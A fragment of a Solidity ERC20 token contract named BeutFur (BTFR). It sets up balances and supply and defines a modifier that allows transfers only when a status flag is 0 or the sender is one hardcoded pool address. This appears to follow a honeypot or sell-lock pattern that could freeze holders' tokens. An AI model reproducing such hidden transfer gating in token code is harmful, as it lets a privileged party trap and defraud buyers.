...
contract BeutFurToken is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenBF_totalSupply;
    uint256 private _tokenBF_status = 0;
    uint256 public stakingPoolBFStatus = 0;

    string private _tokenBF_name;
    string private _tokenBF_symbol;

    address private _poolBFAddress = 0x17A5aA38F87A10c64fd3DBf383c86fD2445d0067;

    constructor() {
        _tokenBF_name = "BeutFur";
        _tokenBF_symbol = "BTFR";
        _tokenBF_totalSupply = 15000 * 10 ** 18;
        _balances[msg.sender] = _tokenBF_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolBFAddress || _tokenBF_status == 0);
        _;
    }
